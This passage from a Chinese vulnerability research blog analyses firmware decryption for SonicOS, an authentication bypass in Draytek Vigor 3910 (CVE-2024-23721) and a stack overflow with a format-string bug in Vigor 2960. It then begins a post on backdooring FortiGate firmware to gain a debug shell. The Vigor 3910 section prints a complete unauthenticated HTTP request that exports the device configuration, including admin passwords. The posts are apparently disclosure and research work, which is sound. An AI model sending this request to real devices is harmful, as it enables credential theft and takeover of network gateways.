<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 获取用户上传的文件，保存到本地路径</span><br><span class="line">2. 固件分为 header 和 body 两个部分，header 中包括 DSA 签名数据</span><br><span class="line">3. 代码计算 body 部分的 SHA1 值，并使用内置公钥对文件完整性进行 DSA 验证</span><br><span class="line">4. 分离 header 和 body</span><br><span class="line">5. 对 body 进行 AES 解密</span><br></pre></td></tr></table></figure></div>

<p>实际上是使用固定的 AES KEY 和 IV 对固件进行解密，参照流程可实现解密程序，具体请参考仓库代码。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>本文分析了 SonicOS 的磁盘和固件加密方法，实现了相应的解密脚本，希望能对感兴趣的研究者有一些帮助。</p>
<p><a class="link"   href="https://badmonkey.site/archives/sonicwall-sma-research" >https://badmonkey.site/archives/sonicwall-sma-research<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.gnu.org/software/grub/grub-download.html" >https://www.gnu.org/software/grub/grub-download.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>Draytek Vigor 3910 &amp; 2960 漏洞分析</title>
    <url>/2024/08/12/CVE-2024-23721/</url>
    <content><![CDATA[<p>本文对 Vigor 3910 的 CVE-2024-23721 和 Vigor 2960 的一个静默修复漏洞进行分析。</p>
<span id="more"></span>

<p>Vigor 3910 和 2960 是台湾 Draytek(居易科技) 公司推出的核心网关设备，均包含 VPN 和防火墙功能，因此在企业场景具有一定的应用。</p>
<h2 id="CVE-2024-23721"><a href="#CVE-2024-23721" class="headerlink" title="CVE-2024-23721"></a>CVE-2024-23721</h2><p>在上一篇<a href="https://wzt.ac.cn/2024/02/19/vigor_3910/">文章</a>中简单介绍了针对 Vigor 3910 的固件解包和模拟过程，3910 设备底层运行的是 Linux 系统，在系统中使用 qemu 模拟启动 sohod64.bin，该文件是 Draytek 自行实现的 DrayOS 系统，业务逻辑基本集中在此文件中。</p>
<p>解包过程不再赘述，我们以 4.3.2.5 版本为例来分析。获取 sohod64.bin 后逆向分析此文件，在 0x40153890 地址找到一个函数，我称之为 <code>process_rquest</code>，该函数应该是处理 HTTP 请求的入口点，会解析请求中的各个字段</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在 [1] 位置调用了 process_post 函数</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  iVar1 = FUN_406514d8(*(undefined4 *)(param_1 + <span class="number">0x4538</span>),&amp;DAT_40f85bb0);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    uVar2 = FUN_40651424(<span class="string">&quot;/ACSServer/Upload&quot;</span>);</span><br><span class="line">    iVar1 = FUN_40651624(param_1 + <span class="number">0x3e2c</span>,<span class="string">&quot;/ACSServer/Upload&quot;</span>,uVar2);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      FUN_401a7f10(param_1);</span><br><span class="line">    &#125;</span><br><span class="line">    uVar2 = FUN_40651424(<span class="string">&quot;/SWMACSServer/Upload&quot;</span>);</span><br><span class="line">    iVar1 = FUN_40651624(param_1 + <span class="number">0x3e2c</span>,<span class="string">&quot;/SWMACSServer/Upload&quot;</span>,uVar2);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      process_post(param_1);    <span class="comment">// [1]</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>当请求类型为 POST 时，会调用 0x4015F640 函数，我称之为 <code>process_post</code>，此函数负责处理 POST 类型请求，其中关键代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">process_post</span><span class="params">(undefined4 *param_1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  undefined auStack_14 [<span class="number">4</span>];</span><br><span class="line">  <span class="type">int</span> local_10;</span><br><span class="line">  <span class="type">int</span> local_c;</span><br><span class="line">  <span class="type">int</span> func_code;</span><br><span class="line">  undefined4 local_4;</span><br><span class="line">  </span><br><span class="line">  local_4 = get_curr_task_prio();</span><br><span class="line">  func_code = translate_name(param_1 + <span class="number">0xf8b</span>,param_1[<span class="number">0xf3e</span>]);    <span class="comment">// [2]</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (func_code &lt; <span class="number">0x1b6c</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (func_code == <span class="number">0x1b67</span>) &#123;    <span class="comment">// [3]</span></span><br><span class="line">        iVar1 = form_evaluate_access(<span class="string">&quot;/auth_check.cgi&quot;</span>,param_1 + <span class="number">5</span>);</span><br><span class="line">        <span class="keyword">if</span> ((iVar1 != <span class="number">-1</span>) &amp;&amp; (iVar1 = check_sFormAuth(param_1[<span class="number">0x114d</span>]), iVar1 != <span class="number">0</span>)) &#123;</span><br><span class="line">          iVar1 = FUN_401590c0(param_1,param_1[<span class="number">0xf3f</span>]);</span><br><span class="line">          <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">            die(<span class="number">0x1b50</span>,<span class="string">&quot;cfg_gci_export_script&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            die(<span class="number">0x1b67</span>,<span class="number">0</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>[2]</code> 处，代码会调用 <code>translate_name</code> 函数来处理请求中的 URL，这个函数会将 URL 和固定的字符串进行匹配</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> (*URL == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">    uVar2 = safe_strlen(<span class="string">&quot;Draytek&quot;</span>);</span><br><span class="line">    iVar1 = safe_strncmp(URL + <span class="number">1</span>,<span class="string">&quot;Draytek&quot;</span>,uVar2);</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) &amp;&amp; (iVar1 = <span class="built_in">strstr</span>(URL,<span class="string">&quot;.exp&quot;</span>), iVar1 != <span class="number">0</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0x1b67</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>当 URL 以 <code>/Draytek</code> 开头并且包含 <code>.exp</code> 字符串时，返回 0x1b67。</p>
<p>回到 <code>process_post</code> 函数，当 <code>translate_name</code> 返回值为 0x1b67 时，来到 <code>[3]</code> 处，代码首先调用 <code>form_evaluate_access</code> 来检查请求是否合法。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">form_evaluate_access</span><span class="params">(__int64 fixed_url, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  fixed_url_1 = fixed_url;</span><br><span class="line">  v15 = a2;</span><br><span class="line">  v2 = get_curr_task_prio(fixed_url, a2);</span><br><span class="line">  v23 = get_request_info(v2);</span><br><span class="line">  fixed_url_1_1 = v23 + <span class="number">23932</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"> </span><br><span class="line">  v10 = safe_strlen(<span class="string">&quot;/auth_check.cgi&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !safe_strncmp(fixed_url_1_1, <span class="string">&quot;/auth_check.cgi&quot;</span>, v10) )    <span class="comment">// [4]</span></span><br><span class="line">    check_pass = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> ( check_pass &gt;= <span class="number">0</span> &amp;&amp; check_is_from_lan(v23, <span class="number">32</span> * check_pass + v2000_table) == <span class="number">-1</span> )    <span class="comment">// [5]</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  dword_4262A750 = dword_47170A24;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>[4]</code> 处，会比较第一个参数是否等于 <code>/auth_check.cgi</code>，显然成立，所以变量 <code>check_pass</code> 为 0。</p>
<p>接着来到 <code>[5]</code> 处，由于 <code>check_pass</code> 等于 0，会继续调用 <code>check_is_from_lan</code> 函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">check_is_from_lan</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> ( strcasestr(v2 + <span class="number">15916</span>, <span class="string">&quot;/weblogin.htm&quot;</span>)</span><br><span class="line">    || strcasestr(v2 + <span class="number">15916</span>, <span class="string">&quot;/cgi-bin/wlogin.cgi&quot;</span>)</span><br><span class="line">    || strcasestr(v2 + <span class="number">15916</span>, <span class="string">&quot;/doc/cgierr.htm&quot;</span>)</span><br><span class="line">    || strcasestr(v2 + <span class="number">15916</span>, <span class="string">&quot;/images/&quot;</span>)    <span class="comment">// [6]</span></span><br><span class="line">    || !sub_4010CD68(v2 + <span class="number">15916</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_121;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">LABEL_121:</span><br><span class="line">  <span class="keyword">if</span> ( !sub_4059A9D4(*(v2 + <span class="number">8</span>)) )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = <span class="number">16</span>;</span><br><span class="line">    getpeername(*(v2 + <span class="number">8</span>), v11 + <span class="number">168</span>, v11 + <span class="number">184</span>);</span><br><span class="line">    v26 = v16;</span><br><span class="line">    <span class="keyword">if</span> ( !sub_40140298(dword_47234F44) &amp;&amp; ((dword_4BE3E72C ^ v26) &amp; dword_4C3FF280) != <span class="number">0</span> &amp;&amp; sub_408A523C(v26, v9) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = sub_408A820C(v26);</span><br><span class="line">      <span class="keyword">if</span> ( (!v25 || !*(v25 + <span class="number">0x1C</span>LL) || (*(v25 + <span class="number">0x16</span>LL) &amp; <span class="number">1</span>) == <span class="number">0</span> &amp;&amp; !sub_4013FAF0(*(v25 + <span class="number">0x24</span>LL), v26))</span><br><span class="line">        &amp;&amp; ((dword_4BE3E758 &amp; <span class="number">1</span>) == <span class="number">0</span> || ((dword_4BE66B98 ^ v26) &amp; dword_4BE66B9C) != <span class="number">0</span>)</span><br><span class="line">        &amp;&amp; !IsFromLan(v26) )</span><br><span class="line">      &#123;</span><br><span class="line">        v38 = (dword_4BE3E758 &amp; <span class="number">4</span>) != <span class="number">0</span> &amp;&amp; (dword_4BE3E760 &amp; <span class="number">5</span>) != <span class="number">0</span> || (word_4BE5AA3A &amp; <span class="number">1</span>) == <span class="number">0</span> || IsFromLan(v40);</span><br><span class="line">        <span class="keyword">if</span> ( v38 &amp;&amp; !sub_4010B418(v26) &amp;&amp; !sub_4010B5FC() &amp;&amp; (word_4BE5AA3A &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">          byte_4690CAF0 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;    <span class="comment">// [7]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>[6]</code> 处判断 URL 中是否包含 <code>/images/</code>，如果是则来到 <code>[7]</code> 处，令 <code>check_is_from_lan</code> 返回 1。回到 <code>form_evaluate_access</code> 函数，当 <code>check_is_from_lan</code> 返回 1 可以继续向下执行，因此 <code>form_evaluate_access</code> 函数也返回 1，在 <code>process_post</code> 函数中就通过了验证。</p>
<p> 随后会调用 <code>check_sFormAuth</code> 函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">check_sFormAuth</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// w0</span></span><br><span class="line">  __int64 v4[<span class="number">3</span>]; <span class="comment">// [xsp+0h] [xbp+0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [xsp+1Ch] [xbp+1Ch]</span></span><br><span class="line">  _BYTE v6[<span class="number">20</span>]; <span class="comment">// [xsp+28h] [xbp+28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [xsp+3Ch] [xbp+3Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = a1;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  safe_memset(v6, <span class="number">0LL</span>, <span class="number">16LL</span>);</span><br><span class="line">  v7 = <span class="built_in">strstr</span>(v5, <span class="string">&quot;sFormAuthStr=&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v7 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v1 = safe_strlen(<span class="string">&quot;sFormAuthStr=&quot;</span>);</span><br><span class="line">  v7 += v1;</span><br><span class="line">  <span class="built_in">strncpy</span>(v4 + <span class="number">40</span>, v7, <span class="number">15LL</span>);    <span class="comment">// [8]</span></span><br><span class="line">  v6[<span class="number">15</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> cmp_authstr(v4 + <span class="number">40</span>) != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">cmp_authstr</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> safe_strcmp(<span class="number">644</span> * dword_4264B86C + <span class="number">608</span> + &amp;unk_4FC06530 + <span class="number">8</span>, a1) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个函数会尝试获取请求中的 sFormAuthStr GET 参数，并调用 <code>cmp_authstr</code> 与内存中保存的数据比较。</p>
<p>这里的问题是，无用户登录的情况下，内存中用于保存 sFormAuthStr 的地址内容为空(0x00)，当我们只传入 GET 参数名 <code>sFormAuthStr=</code>，而不跟随参数值时，在 <code>[8]</code> 处的 strncpy 拷贝的也是空值(0x00)。此时 strcmp 两个参数内容均为空，所以比较成立，导致 <code>check_sFormAuth</code> 返回验证成功。</p>
<p>至此接口的两个验证函数都被绕过，可以直接访问最终的功能函数。回到 <code>process_post</code>，会继续执行 <code>die(0x1b50,&quot;cfg_gci_export_script&quot;);</code>，die 是一个很大的函数，第一个参数是功能对应的 opcode，第二个参数是功能名称，可以看到 0x1b50 对应配置文件导出。</p>
<p>因此构造如下请求能够获取设备的配置文件，配置文件中包含系统管理员密码等敏感信息。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /Draytek.exp/images/?sFormAuthStr= HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 63</span><br><span class="line"></span><br><span class="line">chk_encryptcfg=170&amp;sEncryptPwd=&amp;sEncryptCnfrmPwd=&amp;sFormAuthStr=</span><br></pre></td></tr></table></figure></div>

<p>以管理员身份登录后攻击者可以尝试寻找一些后台漏洞利用，并逃逸到底层的 Linux 系统，实现持久化控制。</p>
<p>目前官方已经修复该漏洞，建议使用该设备的用户及时更新。</p>
<h2 id="Vigor-2960-静默修复漏洞"><a href="#Vigor-2960-静默修复漏洞" class="headerlink" title="Vigor 2960 静默修复漏洞"></a>Vigor 2960 静默修复漏洞</h2><p>与 Draytek 其它型号不同，Vigor 2960 系列设备采用了 Linux 作为底层系统，并没有使用自研的 DrayOS。</p>
<p>有关于 2960 出现过的历史漏洞，网络上有很多复现文章，感兴趣的朋友可以自行查找。需要注意的是该款设备已经处于 <a class="link"   href="https://www.draytek.com/support/product-lifecycle/" >EOS<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 状态，官方支持将持续到 2026 年 12 月，建议使用该设备的用户及时更换新的产品。</p>
<p>在 2024 年 3 月，官方发布了 1.5.1.6 版本更新，该版本中包含对一个未授权远程代码执行漏洞的修复。</p>
<p>web 服务的关键程序是 mainfunction.cgi，这里列举 1.5.1.5 和 1.5.1.6 两个版本代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.5.1.5</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [sp+100h] [bp-40h] BYREF</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;/cvmcfgupload&quot;</span>) || !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;/apmcfgupload&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v21 = getenv(<span class="string">&quot;QUERY_STRING&quot;</span>);</span><br><span class="line">  v22 = <span class="built_in">strcmp</span>(v5, <span class="string">&quot;/apmcfgupload&quot;</span>) == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v21 &amp;&amp; (<span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u), v23 = time(<span class="number">0</span>), (v24 = <span class="built_in">strstr</span>(v21, <span class="string">&quot;session=&quot;</span>)) != <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(s, <span class="string">&quot;%s&quot;</span>, v24 + <span class="number">8</span>, <span class="number">11</span>);    <span class="comment">// [1]</span></span><br><span class="line">    v25 = strtoul(s, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">    v26 = v23 - (v25 ^ (v25 &lt;&lt; <span class="number">16</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.5.1.6</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> s[<span class="number">52</span>]; <span class="comment">// [sp+104h] [bp-34h] BYREF</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;/cvmcfgupload&quot;</span>) || !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;/apmcfgupload&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v20 = getenv(<span class="string">&quot;QUERY_STRING&quot;</span>);</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;/apmcfgupload&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v34, <span class="number">0</span>, <span class="keyword">sizeof</span>(v34));</span><br><span class="line">    <span class="built_in">snprintf</span>(&amp;v33, <span class="number">0x100</span>u, <span class="string">&quot;uci get apmd.general.status&quot;</span>);</span><br><span class="line">    v21 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v34, <span class="number">0</span>, <span class="keyword">sizeof</span>(v34));</span><br><span class="line">    <span class="built_in">snprintf</span>(&amp;v33, <span class="number">0x100</span>u, <span class="string">&quot;uci get cvmd.general.status&quot;</span>);</span><br><span class="line">    v21 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v22 = sub_21F28(&amp;v33);</span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;v33, <span class="number">0x100</span>u, <span class="string">&quot;uci get acc_ctrl.access_control.user_define&quot;</span>);</span><br><span class="line">  v23 = sub_21F28(&amp;v33);</span><br><span class="line">  <span class="keyword">if</span> ( v22 )</span><br><span class="line">  &#123;</span><br><span class="line">    v24 = <span class="built_in">strcmp</span>(v22, <span class="string">&quot;enable&quot;</span>) == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v23 )</span><br><span class="line">      v24 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v24 &amp;&amp; !<span class="built_in">strcmp</span>(v23, <span class="string">&quot;enable&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v20 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0xC</span>u);</span><br><span class="line">        v25 = time(<span class="number">0</span>);</span><br><span class="line">        v26 = <span class="built_in">strstr</span>(v20, <span class="string">&quot;session=&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v26 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">snprintf</span>(s, <span class="number">0xB</span>u, <span class="string">&quot;%s&quot;</span>, v26 + <span class="number">8</span>);    <span class="comment">// [2]</span></span><br><span class="line">          v27 = strtoul(s, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v25 - (v27 ^ (v27 &lt;&lt; <span class="number">16</span>)) &lt;= <span class="number">0x64</span> )</span><br><span class="line">            sub_11660(a3, v20, v21);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(v22);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v23 )</span><br><span class="line">    <span class="built_in">free</span>(v23);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>可以看到这是一个非常简单的漏洞，当用户请求 <code>/cvmcfgupload</code> 或者 <code>/apmcfgupload</code> 时，代码尝试在 GET 参数中找到 session，如果存在的话，在 <code>[1]</code> 处使用 snprintf 将其拷贝到栈缓冲区。</p>
<p>然而 snprintf 的函数定义为</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">snprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br></pre></td></tr></table></figure></div>

<p>其中第二个参数应该是最大长度，但开发者错误的将其设置为格式化字符串 <code>%s</code>，这导致两个问题，栈溢出和 Format string 漏洞。</p>
<p><code>cvmcfgupload</code> 和 <code>apmcfgupload</code> 两个接口不需要权限即可访问，且 cgi 程序没有开启 Canary、NX 等保护措施，栈溢出控制返回地址之后可以直接跳转到 stack 来执行 shellcode，允许攻击者未授权在设备上执行任意代码。新版本在 <code>[2]</code> 处调换了参数位置，完成对漏洞的修复。</p>
<p>目前官方已经修复该漏洞，建议使用该设备的用户及时更新。</p>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>此类参数位置错误，以及对于不安全函数的使用在源码检查或编译阶段就应该被发现并纠正，希望开发者可以重视软件安全，防止恶意攻击造成用户隐私信息泄露和财产损失。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>搭建 FortiGate 调试环境 (二)</title>
    <url>/2024/04/02/fortigate_debug_env2/</url>
    <content><![CDATA[<p>关于如何获取 FortiGate shell 权限，可信执行和新版本 License 授权分析。(二)</p>
<span id="more"></span>

<h2 id="新的验证逻辑"><a href="#新的验证逻辑" class="headerlink" title="新的验证逻辑"></a>新的验证逻辑</h2><p>我们在之前的<a href="https://wzt.ac.cn/2023/03/02/fortigate_debug_env1/">文章</a>中介绍了如何向 FortiGate 中植入后门并获取 SHELL 方便调试，在新版本中，开发者添加了多种系统完整性验证逻辑，并且加密了 rootfs.gz 文件，旧的方法失效，在本篇文章中，提供一种相对简单的方法，实现向新版本 FortiGate 中添加后门并获取 SHELL 权限。</p>
<p>在 2024 年 3 月 4 日，<a class="link"   href="https://www.optistream.io/blogs/tech/fortigate-firmware-analysis" >optistream<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 的研究人员发布了一篇文章，详细描述了在新版 FortiGate 中添加的加密和校验逻辑，并且能够绕过这些校验，最终获取 root shell，感兴趣的朋友可以参考他们的分析文章，这里不再赘述，只做简要总结。</p>
<p>相对于旧版本来说，主要的变动有</p>
<ol>
<li>在内核中添加了对 rootfs.gz 文件的完整性校验和解密算法</li>
<li>在用户态添加了 <code>.db</code> 文件的完整性校验</li>
<li>在系统中实现了 “<em>forticron</em>“  自动任务，可能会在系统运行期间自动对文件系统执行完整性校验</li>
</ol>
<p>后两点本质上对破解流程没有很大影响，只需要找到这些新添加的校验逻辑并将它们 Patch 掉即可。而影响较大的是 rootfs.gz 被加密，并且在内核中进行校验和解密。解密算法在 optistream 分析文章中已经给出，他们的思路为 Patch 掉用户空间完整性校验，植入后门并启动系统，在系统启动时调试内核，跳过内核中的校验算法，最终使得系统能够正常启动，这一点和本博客前篇文章类似。</p>
<p>本文将介绍一种更加简洁的方法，无需调试内核即可正常启动系统。</p>
<h2 id="修改内核"><a href="#修改内核" class="headerlink" title="修改内核"></a>修改内核</h2><p>FortiGate 的内核文件是 flatkc，通过 file 命令可以看到它的格式为：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">flatkc: Linux kernel x86 boot executable bzImage, version 4.19.13 (root@build) #1 SMP Thu Feb 1 17:10:41 UTC 2024, RO-rootFS, swap_dev 0X7, Normal VGA</span><br></pre></td></tr></table></figure></div>

<p>bzImage 是 Linux 内核的一种引导映像格式，主要用于基于 x86&#x2F;x64 架构的计算机，bzImage 中包含被压缩的内核文件(vmlinux)以及一段用于解压内核的代码，另外它还负责处理内核命令行参数等辅助数据。</p>
<p>bzImage 等格式的镜像可以使用 <a class="link"   href="https://github.com/marin-m/vmlinux-to-elf" >vmlinux-to-elf<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 项目直接转换为 ELF 文件，通过分析 ELF 文件定位到校验和解密内核的函数是 fgt_verify_initrd。理想情况下 Patch 内核的思路应该是</p>
<ol>
<li>将 bzImage 解压</li>
<li>修改 vmlinux 中的代码</li>
<li>将 vmlinux 压缩回 bzImage，并确保系统仍能够正常启动</li>
</ol>
<p>前两步可以容易的完成，但如何将 vmlinux 压缩回 bzImage 却没有想象中那样简单。</p>
<p>在分析过程中我查阅了网络上的多篇资料，最终找到一位作者 jamchamb 发布的<a class="link"   href="https://jamchamb.net/2022/01/02/modify-vmlinuz-arm.html" >博客文章<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，文中介绍了如何从逆向角度修改 ARM zImage 内核文件，最终成功完成重打包操作，修改了系统启动时输出的字符串信息。为了方便理解，我们先复现一下文中提到的方法，详细过程可以阅读原作者文章。</p>
<p>首先下载 zImage 文件并使用 QEMU 尝试启动</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">wget https://archive.openwrt.org/releases/17.01.0/targets/armvirt/generic/lede-17.01.0-r3205-59508e3-armvirt-zImage-initramfs -O zImage-initramfs</span><br><span class="line">qemu-system-arm -serial stdio -M virt -m 1024 -kernel zImage-initramfs</span><br></pre></td></tr></table></figure></div>

<p>等待启动后按下回车可正常进入 shell，输出信息如下</p>
